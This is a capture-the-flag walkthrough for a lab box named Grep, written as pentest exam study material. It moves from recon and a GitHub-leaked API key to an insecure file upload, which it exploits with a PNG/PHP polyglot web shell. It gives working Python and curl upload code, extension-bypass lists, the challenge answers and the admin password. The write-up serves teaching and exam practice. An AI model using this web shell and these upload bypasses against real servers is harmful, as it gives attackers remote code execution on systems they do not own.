# Grep / SuperSecure Corp (SearchME) — OSINT + Web Walkthrough (PT1 study edition)

> **What you'll learn:** a complete, methodical web pentest — recon → enumeration → OSINT →
> authenticated access → insecure file upload → RCE → database access → credential recovery.
> Every command is broken down **flag by flag**, with *why* it's the right tool for that step,
> and each phase is labelled so it maps onto the **PT1 methodology** (Recon → Enumeration →
> Exploitation → Post-exploitation).
>
> **Target used in this run:** `10.129.164.123`. Yours will differ — replace the IP everywhere.
>
> The failed attempts are kept in on purpose. In a real assessment (and in the exam) the dead ends
> *are* the learning; a clean narrative that hides them teaches nothing.

> **Flags are redacted in this write-up.** Every flag value is replaced with `[redacted]`.
> The commands, payloads and dead ends are all intact — work the box and you get the real
> string, which is the only part of it that teaches you anything.

---

## The answers (lead with the result)

| # | Question | Answer |
|---|----------|--------|
| 1 | API key that allows a user to register | `ffe60ecaa8bba2f12b43d1a4b15b8f39` |
| 2 | First flag | `THM{[redacted]}` |
| 3 | Email of the "admin" user | `admin@searchme2023cms.grep.thm` |
| 4 | Hostname of the app that checks an email for a password leak | `leakchecker.grep.thm` |
| 5 | Password of the "admin" user | `admin_tryhackme!` |

**Verified vs assumed** — everything above is *verified*, not guessed:
- The register key produced `Registration successful`.
- The flag came straight out of the posts API.
- The admin email came out of the **live database** (and the leak checker keys off it).
- The leak checker returned the password in plaintext, and that password **matches the bcrypt
  hash** in the DB *and* **logs in with `role: admin`**.

---

## How to think about this box (the mental model)

Before any command, form a plan. A web target gives you three obvious questions:

1. **What's listening?** → port scan (Recon).
2. **What does each service expose?** → read pages, JS, certs, directories (Enumeration).
3. **Where's the trust boundary I can cross?** → a leaked secret, an upload that runs code, a
   service that over-shares (Exploitation).

Keep a scratch file of everything you find (hostnames, endpoints, creds). You'll re-use it.

---

## 0. Setup — virtual hosts (the #1 beginner trap)

The web ports only serve real content when the request's **`Host:` header** matches a name the
server expects. Hit the raw IP and you get `403 Forbidden`; use the right name and the site appears.
This is **name-based virtual hosting**: one IP, many sites, distinguished by the `Host` header.

Two names matter here (we'll *discover* them properly in §1.3, but you need them from the start):

- `grep.thm` — main SearchME site (ports 80/443)
- `leakchecker.grep.thm` — leak-check service (port **51337**, HTTPS)

**Option A — edit `/etc/hosts` (needs root):**

```bash
echo "10.129.164.123 grep.thm leakchecker.grep.thm" | sudo tee -a /etc/hosts
```

- `echo "..."` — prints the mapping line (`IP  name1 name2`).
- `|` — pipes that text into the next command's standard input.
- `sudo` — run as root; `/etc/hosts` is root-owned.
- `tee -a` — `tee` writes stdin to a file **and** to the screen; `-a` = **append** (don't
  overwrite the existing file). We use `tee` instead of `>>` because `sudo echo ... >> file`
  wouldn't work — the redirect happens as *your* user, not root. `sudo tee -a` fixes that.

**Option B — no root? Use curl's `--resolve` (used throughout this guide):**

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 https://grep.thm/
```

- `--resolve host:port:ip` — tells curl "when you need `grep.thm` on port 443, connect to this IP"
  — a per-request `/etc/hosts` override. The URL still says `https://grep.thm/`, so the correct
  `Host:` header **and** the correct TLS SNI are sent, which is exactly what vhosts need.
- `-s` — **silent**: hide the progress meter (keeps output clean for scripting).
- `-k` — **insecure**: accept the self-signed TLS certificate without verification. Lab certs are
  self-signed/expired, so without `-k` curl aborts with a cert error. (Never `-k` against real
  production — here it's expected.)

> **PT1 takeaway:** if a box "looks empty" on the IP but the scan shows web ports, suspect vhosts.
> Read the TLS certificate and try `FQDN`-style hostnames.

---

## 1. Recon — find the doors

### 1.1 Confirm the host is up

```bash
ping -c 2 10.129.164.123
```

- `-c 2` — send exactly **2** packets then stop (without it, `ping` runs forever). Two is enough to
  confirm reachability and eyeball latency.

Replies at ~20 ms → alive. (Some boxes block ICMP; if ping fails, don't conclude "down" — go
straight to nmap with `-Pn`, below.)

### 1.2 Port scan — the most important recon step

You scanned all ports, then detailed only the open ones. Do it in two passes; here's why.

**Pass 1 — find every open TCP port, fast:**

```bash
nmap -p- --min-rate 2000 -T4 -Pn 10.129.164.123
```

- `nmap` — the standard network scanner. This is *the* enumeration tool the exam expects.
- `-p-` — scan **all 65,535 TCP ports**, not just nmap's default top-1000. Critical here: the
  interesting service is on **51337**, far outside the top-1000, so a default scan would miss it.
  **Always `-p-` at least once.**
- `--min-rate 2000` — send **at least 2000 packets/second**. This is what makes a full scan finish
  in seconds instead of many minutes. Safe on a lab; on fragile/production networks you'd lower it.
- `-T4` — **timing template 4 ("aggressive")**. Scale: `-T0` (paranoid, IDS-evasion slow) …
  `-T5` (insane, can drop results). `-T4` is the sweet spot for labs: fast and still accurate.
- `-Pn` — **skip host discovery** (treat the host as up; don't ping first). If ICMP is filtered,
  nmap's default ping-then-scan would wrongly mark the host "down" and skip it. `-Pn` guarantees it
  scans. Since we already know it's up, this also saves a step.

**Pass 2 — deep scan only the open ports:**

```bash
nmap -sV -sC -p 22,80,443,51337 -Pn 10.129.164.123
```

- `-p 22,80,443,51337` — restrict to the ports pass 1 found open. No point re-scanning 65k ports;
  this makes the slow `-sV`/`-sC` work run in seconds.
- `-sV` — **service/version detection**. nmap talks to each port and fingerprints the software
  (e.g. `Apache httpd 2.4.41`, `OpenSSH 8.2p1`). Versions feed vulnerability lookups.
- `-sC` — run nmap's **default script set** (equivalent to `--script=default`). These NSE scripts
  grab low-hanging fruit: HTTP titles, TLS certificate details, etc. **The TLS cert scripts are how
  we'll learn the hostnames** — see §1.3.
- `-sV -sC` together are so common they're bundled as `-A` (which also adds OS detection and
  traceroute). Beginners often just use `-A`; spelling them out teaches what each does.

Result:

```
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open  http     Apache httpd 2.4.41 (default Ubuntu page)   <- placeholder site
443/tcp   open  ssl/http Apache 2.4.41
51337/tcp open  http     Apache 2.4.41
```

Port 80 is just the Apache default page (a decoy). The real app is on 443, and something else is on
51337.

### 1.3 Read the TLS certificates — free hostnames

When a service speaks TLS, its certificate's **Common Name (CN)** usually reveals the intended
hostname. That's your vhost. Two ways:

**Via the nmap `-sC` output** — the `ssl-cert` script already printed:
`Subject: commonName=grep.thm` on 443. That's how we know the main host.

**Manually, so you understand the plumbing:**

```bash
openssl s_client -connect 10.129.164.123:51337 </dev/null 2>/dev/null | openssl x509 -noout -subject
```

- `openssl s_client -connect IP:PORT` — open a raw TLS connection and print the certificate the
  server presents. This is the go-to "what cert is here?" command.
- `</dev/null` — feed empty input so the interactive client **closes immediately** after the
  handshake instead of waiting for you to type. Without it the command hangs.
- `2>/dev/null` — discard stderr (openssl's verbose handshake chatter) so only the cert matters.
- `| openssl x509 -noout -subject` — pipe the cert into the X.509 parser; `-noout` = don't re-print
  the raw certificate, `-subject` = print only the Subject line.

Output: `subject=... CN=leakchecker.grep.thm`. **That's the hostname for port 51337 → Question 4.**

There's a second confirmation that 51337 is HTTPS: speak plain HTTP to it and Apache complains:

```bash
curl -s http://10.129.164.123:51337/
#   ...Reason: You're speaking plain HTTP to an SSL-enabled server port...
```

So: **use `https://` on 51337.**

> **PT1 takeaway:** certificates, redirects, and error messages leak hostnames and tech. Read them
> before brute-forcing anything — enumeration beats guessing.

---

## 2. Enumeration — explore the SearchME app

Fetch the front page:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 https://grep.thm/
```

It redirects to `/public/html/` and shows **SearchME** ("under development") with **Login** and
**Register** links.

### 2.1 Always read the client-side JavaScript

The register page loads a JS file. **Reading front-end JS is a core web-pentest habit** — it
documents the API for you: endpoints, methods, headers, expected fields.

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 https://grep.thm/public/js/register.js
```

```javascript
fetch('../../api/register.php', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Thm-Api-Key': 'e8d25b4208b80008a9e15c8698640e85'   // an API key, shipped to the browser
  },
  body: JSON.stringify({ username, password, email, name }),
})
```

Two facts learned: registration is `POST /api/register.php`, and it needs a header
`X-Thm-Api-Key`. Also note `login.js` shows the app redirects to `admin.php` when `role == 'admin'`
— so **roles exist**, worth remembering for later.

### 2.2 First dead end (kept in) — the JS key is a decoy

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/register.php \
  -H 'Content-Type: application/json' \
  -H 'X-Thm-Api-Key: e8d25b4208b80008a9e15c8698640e85' \
  -d '{"username":"pentest01","password":"Passw0rd!23","email":"a@b.c","name":"x"}'
#   {"error":"Invalid or Expired API key"}
```

New curl flags:

- `-X POST` — set the HTTP **method** to POST (default is GET). The API only accepts POST here.
- `-H 'Header: value'` — add a request header. Used twice: one to declare a JSON body, one for the
  API key. `Content-Type: application/json` matters because the server does `json_decode()` on the
  body — send form-encoding and it won't parse.
- `-d '...'` — the **request body** (the JSON payload). With `-d`, curl also implies `POST`, but we
  keep `-X POST` explicit for clarity.

**Rejected.** The key in the JavaScript is expired/decoy. That's the OSINT nudge: the *real* key
lives somewhere the developers didn't mean to publish.

> **PT1 takeaway:** secrets in client-side code are always suspect — sometimes real, sometimes
> honeypots. When one fails, pivot to OSINT for the genuine value.

---

## 3. OSINT — the leaked key on GitHub (Question 1)

### 3.0 Why GitHub? (don't skip the reasoning — this is the exam skill)

The jump to "search GitHub" is **not** a lucky guess. It's forced by three signals you already
collected. Learn to see this pattern; PT1 grades the *reasoning*, not the answer.

**Signal 1 — the error said "Expired", not "missing".** The register API replied
`Invalid or **Expired** API key`. *Expired* implies the developers **rotated** the key: there was an
old value, they changed it to a new one. Rotation happens in **version control**. So a valid key
exists, it isn't in the page you can see, and its *history* lives somewhere versioned.

**Signal 2 — the room literally tells you to.** The task says *"use OSINT techniques to gather
information from publicly accessible sources."* That's the instruction to stop poking the app and go
look at the company's **public footprint**. OSINT on a software company asks one question: *where do
developers accidentally publish things?* Ranked by how often it pays off:
**public code repos → paste sites (Pastebin) → open cloud buckets (S3) → job posts / social media.**
GitHub is #1 because that's where code — and its history, and its leaked secrets — lives.

**Signal 3 — it's a "CMS in development".** The app calls itself a CMS "under development."
Software in development ⇒ a source repository somewhere. Natural OSINT pivot: *does this app's code
exist publicly?*

> **The chain:** a rotated secret **+** an explicit OSINT mandate **+** a codebase-driven app
> **⇒** go find the source repository, GitHub first.

### 3.1 How to actually *find* the repo (from scratch, no walkthrough)

You don't conjure the URL — you follow a **unique string** from the app into the developer's public
code. Every good OSINT pivot starts from something distinctive you enumerated earlier:

- **App / company / developer names** → GitHub's search bar: `searchme`, `supersecure`,
  `SearchME CMS`. The repo `supersecuredeveloper/searchmecms` shows up right away.
- **A unique code artifact (the strongest pivot):** you already saw the header **`X-Thm-Api-Key`**
  in `register.js`. That string is distinctive enough to grep the entire internet for. Use GitHub
  **code search** for `X-Thm-Api-Key`, or Google dorks:

  ```
  site:github.com "X-Thm-Api-Key"
  site:github.com searchme cms
  ```

  - `site:github.com` — a **Google dork** operator restricting results to one domain. Dorks
    (`site:`, `intext:`, `inurl:`, `filetype:`) are core OSINT: they turn a search engine into a
    targeted recon tool.
- **Author identity (pivot deeper):** once you're in the repo, commit metadata leaks the developer's
  email (`fredmoore+github@tryhackme.com`) and handle — more strings to pivot on if you needed to.

Following any of those lands you here:

```
https://github.com/supersecuredeveloper/searchmecms
```

### 3.2 The vulnerability — Git never forgets

**Key concept.** Deleting a secret in a *later* commit does **not** remove it from history; the old
value still lives in the **diff** of the commit that "removed" it. Anyone can check out the previous
commit — or just read the diff — and recover it. This is one of the most common real-world findings
(leaked API keys, DB passwords, cloud tokens) and a classic exam scenario.

You can do the whole thing in a browser (repo → **Commits** → open the suspicious commit → read the
red/removed lines). Here it's shown via the GitHub REST API so the steps are copy-pasteable and
scriptable.

**List the commit messages:**

```bash
curl -s https://api.github.com/repos/supersecuredeveloper/searchmecms/commits | grep '"message"'
#   "Feature update"
#   "Fix: remove key"     <- the tell
#   "Initial commit"
```

- `curl -s <api-url>` — GitHub's API returns JSON; no auth needed for public repos. `-s` keeps it
  quiet. (No `-k` here — this is real GitHub with a valid cert.)
- `| grep '"message"'` — filter thousands of JSON lines down to just the commit-message lines.
  `grep` prints lines matching a pattern; the pattern `"message"` targets the JSON field. This is
  "graph-augmented grep": narrow a big blob to the interesting part fast.

A commit literally called **"Fix: remove key"** is exactly where a leaked secret hides. Open its
diff:

```bash
curl -s https://api.github.com/repos/supersecuredeveloper/searchmecms/commits/db11421db2
```

The `patch` field shows the swap:

```php
- if (... $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {   // removed = the real key
+ if (... $headers['X-THM-API-Key'] === 'TBA') {
```

> **Tooling note for the exam:** in a real engagement you'd point `trufflehog` or `gitleaks` at the
> repo to find secrets across *all* history automatically. Doing it by hand once teaches you what
> those tools actually look for.

### ✅ Question 1 — API key: `ffe60ecaa8bba2f12b43d1a4b15b8f39`

---

## 4. Authenticated access — register, log in, grab the flag (Question 2)

### 4.1 Header casing gotcha

The app compares the header name **literally** as `X-Thm-Api-Key` (the exact casing from
`register.js`). HTTP header names are officially case-insensitive, but this PHP code reads a
specific key from an array, so **casing matters here**. With the real key and correct casing:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/register.php \
  -H 'Content-Type: application/json' \
  -H 'X-Thm-Api-Key: ffe60ecaa8bba2f12b43d1a4b15b8f39' \
  -d '{"username":"pentest01","password":"Passw0rd!23","email":"pentest01@example.com","name":"Pen Test"}'
#   {"message":"Registration successful."}
```

### 4.2 Log in and capture the session cookie

```bash
curl -sk -i --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/login.php \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentest01","password":"Passw0rd!23"}'
#   Set-Cookie: PHPSESSID=xxxxxxxx; path=/
#   {"message":"Login successful.","role":"user"}
```

- `-i` — **include the response headers** in the output. We need this to *see* the `Set-Cookie`
  header. Without `-i` you'd only get the JSON body and miss the session ID.

Copy the `PHPSESSID` value — it *is* your logged-in identity for the next requests.

> **How real cookie sessions work:** the server generates a random `PHPSESSID`, stores your
> logged-in state against it server-side, and you present it on each request to prove who you are.
> Steal/guess that ID and you're that user — which is why session handling is a whole exam topic.

### 4.3 The flag is in the posts API, not the HTML

`dashboard.js` shows the page fills itself by calling `fetch('../../api/posts.php')`. So don't scrape
HTML — call the API directly with your cookie:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 \
  -b 'PHPSESSID=PASTE_YOURS_HERE' https://grep.thm/api/posts.php
#   [{"title":"First Flag","content":"THM{[redacted]}"}, ...]
```

- `-b 'PHPSESSID=...'` — send a **cookie** with the request (`-b` = "cookie jar / cookie string").
  This is what makes the request *authenticated*. Without it: `{"error":"Not logged in"}`.

### ✅ Question 2 — First flag: `THM{[redacted]}`

---

## 5. The leak checker (Question 4, and the door to Question 5)

Load the service on 51337 using the hostname from the certificate:

```bash
curl -sk --resolve leakchecker.grep.thm:51337:10.129.164.123 https://leakchecker.grep.thm:51337/
```

- `--resolve leakchecker.grep.thm:51337:10.129.164.123` — same pinning trick, but note the **port
  is 51337** in all three positions of the URL, header, and resolve rule. A mismatch here is a
  common self-inflicted error.

It's a single-field form (*Email Leak Checker*) that POSTs `email=...` to `check_email.php`.

### 5.1 Second dead end (kept in) — "Invalid email!" means "not in my list"

```bash
curl -sk --resolve leakchecker.grep.thm:51337:10.129.164.123 \
  -X POST https://leakchecker.grep.thm:51337/check_email.php \
  --data-urlencode 'email=admin@grep.thm'
#   Invalid email!
```

- `--data-urlencode 'email=...'` — like `-d`, but **URL-encodes the value** first. Emails contain
  `@` (and could contain `+`, spaces, etc.) which must be percent-encoded in a form body
  (`@` → `%40`). `--data-urlencode` does that for you so the server receives a clean
  `application/x-www-form-urlencoded` field. Using plain `-d` with special characters can corrupt
  the value.

I tried several guessed emails (`admin@grep.thm`, `fredmoore@tryhackme.com`, …) — all `Invalid
email!`. **Lesson:** here `Invalid email!` doesn't mean *malformed*; it means *that address isn't in
my leak database*. The checker only reacts to the one real email it knows. So I need the admin's
**actual** email first (§6) before this tool does anything.

> **PT1 takeaway:** don't over-interpret an app's error text. Confirm what a message *actually*
> means by sending known-good and known-bad inputs and comparing responses.

### ✅ Question 4 — Leak-checker hostname: `leakchecker.grep.thm`

---

## 6. Exploitation — insecure file upload → RCE → the admin email (Question 3)

### 6.1 Spot the flaw in source

Back to the GitHub repo. `api/upload.php` (updated in commit **"Feature update"**) validates uploads
by **magic bytes**, then saves the file under its **original name**:

```php
function checkMagicBytes($fileTmpPath, $validMagicBytes) {
    $fileMagicBytes = file_get_contents($fileTmpPath, false, null, 0, 4); // read first 4 bytes
    return in_array(bin2hex($fileMagicBytes), $validMagicBytes);
}
$validMagicBytes = ['jpg'=>'ffd8ffe0','png'=>'89504e47','bmp'=>'424d'];
// ...saves as $uploadPath . $fileName  (keeps whatever extension you sent)
```

- **Magic bytes** = the first few bytes that identify a file type. PNG starts with
  `89 50 4E 47` (`\x89PNG`). Checking them is *stronger* than trusting a `.png` extension — but
  it's still not enough.
- **The bug:** the check only looks at the first 4 bytes and then keeps your filename/extension.
  So a file that *starts with* the PNG signature but is *named* `shell.php` passes validation and is
  saved as a `.php` file — which Apache will happily **execute**. Content-type check ✓, but code
  execution wide open.

> **Caveat — the repo is not the deployment.** This snippet is what's *published on GitHub*. The
> code actually running on the box may be newer, stricter, or simply different. Treat leaked source
> as a **hypothesis about the target**, never as ground truth. §6.3 is what happens when you forget
> that.

### 6.2 Build the payload

The payload is: **PNG magic bytes** + a tiny **PHP web shell**, sent with `filename="p0wn.php"`.

```python
import ssl, http.client, uuid
sid = "PASTE_YOUR_PHPSESSID"                                 # upload requires a logged-in session
shell = b"\x89PNG\r\n\x1a\n" + b"<?php system($_REQUEST['c']); ?>"   # magic bytes + web shell
b = "----b" + uuid.uuid4().hex                              # multipart boundary
body = (f'--{b}\r\nContent-Disposition: form-data; name="file"; '
        f'filename="p0wn.php"\r\nContent-Type: image/png\r\n\r\n').encode() + shell + f"\r\n--{b}--\r\n".encode()
c = http.client.HTTPSConnection("10.129.164.123", 443, context=ssl._create_unverified_context())
c.request("POST", "/api/upload.php", body=body, headers={
    "Host": "grep.thm",                                     # vhost header, since we connect by IP
    "Content-Type": f"multipart/form-data; boundary={b}",   # tells PHP it's a file upload
    "Cookie": f"PHPSESSID={sid}"})                          # authenticated
print(c.getresponse().read().decode())
```

Line-by-line intent:
- `shell` — the exact file bytes. `<?php system($_REQUEST['c']); ?>` runs whatever command you pass
  in the `c` parameter (GET or POST) and prints its output.
- `Content-Disposition ... filename="p0wn.php"` — the malicious filename; the `.php` extension is
  the whole point.
- `Content-Type: image/png` (the *part* header) — cosmetic here; the server checks bytes, not this.
- `ssl._create_unverified_context()` — the Python equivalent of curl's `-k` (accept the self-signed
  cert).
- `Host: grep.thm` — because we connect to the IP directly, we must set the vhost by hand.

The same thing with `curl -F` — shorter, and what the rest of this guide uses. Build the file on
disk first, then **look at it** before sending:

```bash
python3 -c 'open("p0wn.php","wb").write(b"\x89PNG\r\n\x1a\n<?php system($_REQUEST[\"c\"]); ?>")'
xxd p0wn.php | head -1
#   00000000: 8950 4e47 0d0a 1a0a 3c3f 7068 7020 7379  .PNG....<?php sy
```

- `python3 -c '...'` writes the file **in binary mode** (`"wb"`) so `\x89` lands as one byte `0x89`.
  Creating this file in a text editor, or with `echo`, is the classic way to get bytes that only
  *look* right. `echo` will not emit `0x89` without `-e`/`printf`, and an editor may add a trailing
  newline or re-encode the high byte as UTF-8 (`0xC2 0x89`) — which silently breaks the signature.
- `xxd file | head -1` — dump the first 16 bytes as hex + ASCII. **Run this every single time.**
  If byte 0 isn't `89`, nothing downstream will work and the server's error won't tell you why.

### 6.3 Dead end #1 (kept in) — "Invalid file type", and how to find out which check bit you

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/upload.php \
     -b 'PHPSESSID=PASTE_YOURS_HERE' \
     -F 'file=@pown.php;type=image/png'
#   {"error":"Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed."}
```

Rejected. Two things worth noticing before touching the payload:

1. **The filename in the command (`pown.php`) is not the file that was built (`p0wn.php`).** Typos
   like this are the single most common cause of "my exploit stopped working." See §6.4 — it has a
   nastier failure mode than you'd expect.
2. **The error message is ambiguous.** "Invalid file type" could mean *your bytes were rejected* or
   *your extension was rejected*. Do not guess which — the two need completely different bypasses.

**Diagnosis, step 1 — reproduce the server's check locally.** PHP is on Kali; you don't need the
target to learn how PHP classifies your file. This is Gate 2 discipline: probe the cheapest unknown
before rebuilding anything.

```bash
php -r '
foreach (["naive.php","p0wn.php"] as $f) {
  $g = @getimagesize($f);
  $fi = new finfo(FILEINFO_MIME_TYPE);
  printf("%-10s finfo=%-22s getimagesize=%s\n", $f, $fi->file($f) ?: "FAIL",
    $g === false ? "FALSE" : $g["mime"]." ".$g[0]."x".$g[1]);
}'
#   naive.php  finfo=application/octet-stream  getimagesize=image/png 1937007981x673472338
#   p0wn.php   finfo=image/png                 getimagesize=image/png 1x1
```

Two findings, and both are exam material:

- **`getimagesize()` and `finfo` are not the same check.** The 8-byte-header file *passes*
  `getimagesize()` — it just returns nonsense dimensions, because it read your PHP source text
  (`<?php sys…`) as the IHDR width and height fields. `finfo`/`mime_content_type` (libmagic) wants
  the `IHDR` chunk to actually be there and calls the same file `application/octet-stream`.
- So **"checking magic bytes" is not one technique.** Which function the target uses decides whether
  a bare signature is enough or whether you need a structurally valid image.

**Diagnosis, step 2 — the 2×2 differential.** If a stronger payload still fails, stop guessing and
change **one variable at a time**. Four uploads; the pattern names the cause:

```bash
U() { curl -sSk --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/upload.php \
        -b "PHPSESSID=$SID" -F "file=@$1;filename=$2;type=image/png"; echo "  <- $2"; }

U base.png  clean.png    # 1. clean PNG, clean name   -> baseline, must succeed
U base.png  clean.php    # 2. clean PNG, .php name
U p0wn.php  shell.png    # 3. polyglot,  clean name
U p0wn.php  shell.php    # 4. polyglot,  .php name    -> the goal
```

| Result | Diagnosis | Next move |
|---|---|---|
| 1 fails | session, field name or endpoint is wrong | fix the request before touching payloads |
| 2 fails, 3 passes | **extension allowlist** | try `.phtml`, `.phar`, `.php5`, `.pHp`, `shell.png.php` |
| 3 fails, 2 passes | **content check** | build a structurally valid image (below) |
| 2 and 3 pass, 4 fails | both checked together | need one payload that beats both |

**The fix — a real PNG, not just its first 8 bytes.** Generate a genuine 1×1 image and append the
shell after the `IEND` chunk. The decoder stops at `IEND`; the PHP interpreter does not:

```bash
python3 -c '
from PIL import Image
Image.new("RGB",(1,1),(255,255,255)).save("base.png")     # a real, complete PNG
png = open("base.png","rb").read()
open("p0wn.php","wb").write(png + b"\n<?php system($_REQUEST[\"c\"]); ?>\n")
'
xxd p0wn.php | head -1     # 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
```

Note the difference from the naive version: `...IHDR` follows the signature instead of `<?php`.
That's the whole fix.

A second variant worth keeping in your back pocket — payload inside a PNG `tEXt` comment chunk
rather than appended. It survives some server-side re-encoding that would strip trailing bytes:

```bash
cp base.png exif.php
exiftool -Comment='<?php system($_REQUEST["c"]); ?>' exif.php
```

> **PT1 takeaway:** an app's rejection message tells you *that* you failed, almost never *why*.
> Recreate the check on your own machine, then run a differential that isolates one variable. That's
> the difference between debugging and guessing.

### 6.4 Dead end #2 (kept in) — the upload that returns *nothing at all*

This one cost real time and it's worth internalising, because it looks like success:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/upload.php \
     -b 'PHPSESSID=vv3in0pl566m0hsslt2mhhfpjn' \
     -F "file=@$S/p0wn.php;type=image/png"
#   (no output — no error, no JSON, nothing)
```

No error looks like no problem. It isn't. **The request was never sent.**

Two causes stacked on top of each other:

1. **`$S` was unset.** The shell variable holding the payload directory was defined in an earlier
   terminal. Open a new tab, or `su`, or reconnect over SSH, and it's gone. Unset variables expand
   to the empty string in bash/zsh — silently — so `-F "file=@$S/p0wn.php"` became
   `-F "file=@/p0wn.php"`, a path that doesn't exist.
2. **`-s` hid the error.** `-s` is "silent", and that covers *error messages*, not just the
   progress bar. curl found no local file, aborted before opening a socket, and said nothing.

Proof, reproduced locally:

```bash
unset S
curl -sk  -X POST https://grep.thm/api/upload.php -F "file=@$S/p0wn.php"; echo "exit=$?"
#   exit=26                                              <- silent

curl -sSk -X POST https://grep.thm/api/upload.php -F "file=@$S/p0wn.php"; echo "exit=$?"
#   curl: (26) Failed to open/read local data from file/application
#   exit=26                                              <- the error -s was swallowing
```

**curl exit codes you should recognise on sight:**

| Code | Meaning | Typical cause here |
|------|---------|--------------------|
| `0`  | success | request completed (says nothing about the HTTP status) |
| `6`  | couldn't resolve host | missing `/etc/hosts` entry or `--resolve` |
| `7`  | couldn't connect | wrong port, host down, firewall |
| `26` | **read error** | `-F`/`-T` pointed at a file that doesn't exist |
| `28` | timeout | wrong IP, or the box is filtering |
| `35` / `60` | TLS failure | forgot `-k` on a self-signed lab cert |

**The habits that prevent this — adopt all three:**

```bash
export S=/absolute/path/to/payloads          # 1. absolute path, exported, re-set in every new shell
ls -l "$S/p0wn.php" || echo 'PAYLOAD MISSING' # 2. assert the file exists before you send it

curl -sSk -w '\n[http %{http_code}] [sent %{size_upload}B]\n' \
     --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/upload.php \
     -b "PHPSESSID=$SID" -F "file=@$S/p0wn.php;type=image/png"
```

- `-sS` — silent **but still print errors**. Make this your default instead of bare `-s`. There is
  almost no situation where you want curl to fail quietly.
- `-w '%{http_code}'` — print the HTTP status after the body. An empty body with `200` is a server
  that returned nothing; an empty body with *no status line at all* means curl never got that far.
- `%{size_upload}` — bytes actually uploaded. `0` proves your file never left the machine.

> **PT1 takeaway:** *silence is not success.* Every command has an exit code — check it. In an exam
> you will lose more time to a mistyped path and a swallowed error than to any real defence.

### 6.5 Dead end #3 (kept in) — `{"error":"No file uploaded."}` — the missing `@`

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/upload.php \
     -b 'PHPSESSID=PASTE_YOURS_HERE' \
     -F "file=pown.php;type=image/png"
#   {"error":"No file uploaded."}
```

The file exists this time, and the server still says there's no file. It's right. **`-F` without a
leading `@` sends the *string* `pown.php`, not the file it names.**

Capture the raw multipart body and the difference is obvious. Here are all four forms, with the
actual bytes curl put on the wire:

```
-F "file=pown.php"                       (159 B)
  Content-Disposition: form-data; name="file"
                                                   <- no filename= parameter
  pown.php                                         <- the literal 8-character string

-F "file=pown.php;type=image/png"        (184 B)   <- the exact command above
  Content-Disposition: form-data; name="file"
  Content-Type: image/png                          <- looks like an image part...
                                                   <- ...but still no filename=
  pown.php                                         <- still the literal string

-F "file=@pown.php"                      (252 B)
  Content-Disposition: form-data; name="file"; filename="pown.php"
  Content-Type: application/octet-stream
  \x89PNG\r\n\x1a\n<?php system($_REQUEST["c"]); ?>   <- the real bytes

-F "file=<pown.php"                      (191 B)
  Content-Disposition: form-data; name="file"
                                                   <- no filename= parameter
  \x89PNG\r\n\x1a\n<?php system($_REQUEST["c"]); ?>   <- real bytes, wrong part type
```

**What PHP does with each:**

| curl syntax | Sends | PHP populates | Result |
|---|---|---|---|
| `-F 'file=value'` | literal string as a text field | `$_POST['file']` | `$_FILES` empty → **"No file uploaded"** |
| `-F 'file=value;type=…'` | same, plus a `Content-Type` header | `$_POST['file']` | same — the `type=` is decoration |
| `-F 'file=@path'` | **file part** with `filename=` | `$_FILES['file']` | ✅ what you want |
| `-F 'file=<path'` | file *contents* as a text field | `$_POST['file']` | `$_FILES` empty → same error |

The rule PHP applies: a multipart part becomes an entry in `$_FILES` **only if its
`Content-Disposition` carries a `filename=` parameter.** No `filename=`, no upload — regardless of
how convincing the `Content-Type` looks.

Two traps worth naming:

- **`;type=image/png` fires either way.** In the failing command curl *did* emit
  `Content-Type: image/png`, which makes the request look correct in Burp at a glance. The missing
  `filename=` is the only tell, and it's one line higher up.
- **`<` is worse than nothing.** `-F 'file=<pown.php'` genuinely reads your file, so the body length
  looks plausible and the payload bytes are all there — but it's still a text field, and `$_FILES`
  is still empty. If you're eyeballing byte counts to check your work, this one sails past.

The fix is one character:

```bash
-F "file=@pown.php;type=image/png"
#         ^
```

> **PT1 takeaway:** when an app says a parameter is missing and you're sure you sent it, **look at
> the bytes you actually sent**. `curl --trace-ascii /dev/stdout`, Burp, or a three-line local
> listener will settle it in seconds. Arguing with the server from your memory of the command is how
> you lose an hour.

Catch it before you send, by making curl show you the request:

```bash
curl -sSk --trace-ascii /dev/stdout -o /dev/null \
     --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/upload.php \
     -b "PHPSESSID=$SID" -F "file=@$S/p0wn.php;type=image/png" | grep -i 'content-disposition'
#   Content-Disposition: form-data; name="file"; filename="p0wn.php"
```

If `filename=` isn't in that line, stop — the upload cannot work.

### 6.6 Upload the working payload

```bash
export SID='PASTE_YOUR_PHPSESSID'
export S="$PWD"                       # wherever p0wn.php actually lives

curl -sSk -w '\n[http %{http_code}]\n' --resolve grep.thm:443:10.129.164.123 \
     -X POST https://grep.thm/api/upload.php \
     -b "PHPSESSID=$SID" \
     -F "file=@$S/p0wn.php;type=image/png"
#   {"message":"File uploaded successfully."}
#   [http 200]
```

- `-F 'file=@path'` — multipart upload. The field name **`file`** must match what the app expects;
  read it out of the page's JS rather than assuming.
- `;type=image/png` — sets the *part's* `Content-Type`. Cosmetic if the server sniffs bytes, free to
  include.
- The filename sent is taken from the path, so the file on disk must literally be named `p0wn.php`.
  To decouple the two: `-F "file=@$S/payload.bin;filename=p0wn.php;type=image/png"`.

**Do not move on until you have seen that JSON.** `{"message":"File uploaded successfully."}` plus
